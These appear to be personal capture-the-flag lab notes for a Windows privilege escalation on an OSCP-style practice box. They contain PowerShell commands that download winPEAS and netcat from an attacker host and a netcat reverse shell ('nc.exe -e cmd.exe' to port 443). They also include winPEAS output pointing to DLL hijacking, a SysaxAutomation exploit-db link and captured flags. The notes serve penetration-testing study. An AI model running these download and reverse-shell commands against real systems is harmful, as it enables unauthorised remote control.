

Upload winpeas to privexac
![[{FBE9B7D0-7716-48DF-B715-B75BB8173904}.png]]
![[{35C2E3A7-2181-4F47-BEE1-513AE6253056}.png]]

```
Control-C
PS C:\Users\clinton\Desktop> Invoke-WebRequest -Uri "http://192.168.49.114:8000/winPEASx64.exe" -OutFile "C:\Users\clinton\Desktop\winPEASx64.exe"

C:\Users\clinton\Desktop>powershell                                                                                                                                                                                                         
powershell                                                                                                                                                                                                                                  
Windows PowerShell                                                                                                                                                                                                                          
Copyright (C) Microsoft Corporation. All rights reserved.                                                                                                                                                                                   
                                                                                                                                                                                                                                            
Try the new cross-platform PowerShell https://aka.ms/pscore6                                                                                                                                                                                
                                                                                                                                                                                                                                            
PS C:\Users\clinton\Desktop> ls                                                                                                                                                                                                             
ls                                                                                                                                                                                                                                          


    Directory: C:\Users\clinton\Desktop


Mode                 LastWriteTime         Length Name                                                                      
----                 -------------         ------ ----                                                                      
-a----          6/9/2025  12:42 PM              0 Invoke-WebRequest                                                         
-a----          6/8/2025   7:09 PM             34 local.txt                                                                 
-a----          6/9/2025  12:40 PM          59392 nc.exe                                                                    
-a----          6/9/2025  12:26 PM       10144256 winPEASx64.exe                                                            


PS C:\Users\clinton\Desktop> ./winPEASx64.exe
./winPEASx64.exe

```

upload nc 

![[{4F7ECB5A-4CDF-46BA-B1F7-018625572A69}.png]]
```
Invoke-WebRequest -Uri "http://192.168.49.114:8000/nc.exe" -OutFile "C:\Users\clinton\Desktop\nc.exe"

PS C:\Users\clinton\Desktop> Invoke-WebRequest -Uri "http://192.168.49.114:8000/nc.exe" -OutFile "C:\Users\clinton\Desktop\nc.exe"
PS C:\Users\clinton\Desktop> .\nc.exe -e cmd.exe 192.168.49.114 443
PS C:\Users\clinton\Desktop> .\nc.exe -e cmd.exe 192.168.49.114 443

```
![[{62C82FFE-B8E8-4BC9-8698-F8EA9E61DA82}.png]]

![[{2475632E-322C-4B37-AEFB-529479F96425}.png]]

![[{970425CB-440A-4D95-87BC-2FE15B6ABB3C}.png]]
```

C:\Users\clinton\Desktop>whoami
whoami
oscp\clinton

C:\Users\clinton\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.114.111
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.114.254

C:\Users\clinton\Desktop>type local.txt 
type local.txt
7914ab71cb725e5c47f2d2c23489c36d

```


# winpeas

```

    OneDrive(6828)[C:\Users\clinton\AppData\Local\Microsoft\OneDrive\OneDrive.exe] -- POwn: clinton
    Permissions: clinton [AllAccess]
    Possible DLL Hijacking folder: C:\Users\clinton\AppData\Local\Microsoft\OneDrive (clinton [AllAccess])
    Command Line: "C:\Users\clinton\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background


����������͹ Checking write permissions in PATH folders (DLL Hijacking)
� Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Program Files (x86)\SysaxAutomation\


```

https://www.exploit-db.com/exploits/50834

# sysaxAutomation 

![[{F49A3AA9-DAB1-4244-862E-CAFCCF4C0D8F}.png]]

![[{DC71FD25-E0C5-4D0E-AE63-C065CB643E27}.png]]

![[{C649BD2E-1DD7-46F7-9632-4206AA0DC576}.png]]

![[{7AFC6502-28C3-4E7F-AA81-9115A5AA4F4D}.png]]


![[{4A01A13E-7748-4D64-B614-A2F4F3F2152C}.png]]

![[{AC0D0194-BD36-4F57-A5CD-5CF78179AFAF}.png]]

![[{742A0094-B54F-4002-A327-4FBD13822002}.png]]

![[{2D3E7F01-1362-4002-962D-F731A1A8F64F}.png]]

![[{A9FDE34E-0AD4-44F9-ADF9-D1B3E8153096}.png]]

![[{D921C9D0-1AD7-451D-A5C7-6B9771F22CFD}.png]]

![[{5907DDC4-5631-4FD8-9440-6459CC11A34A}.png]]

![[{8B7E31E0-7A80-4AC0-A4F4-73117C256D3D}.png]]

![[{4BBAA73B-96EF-4652-811F-0A64F2454322} 1.png]]

PROOF
dcc198fcab45e2a20365a51b8e67c011 

![[{3C4F8EA7-33FD-4769-9D1C-631AA8DB3B18}.png]]
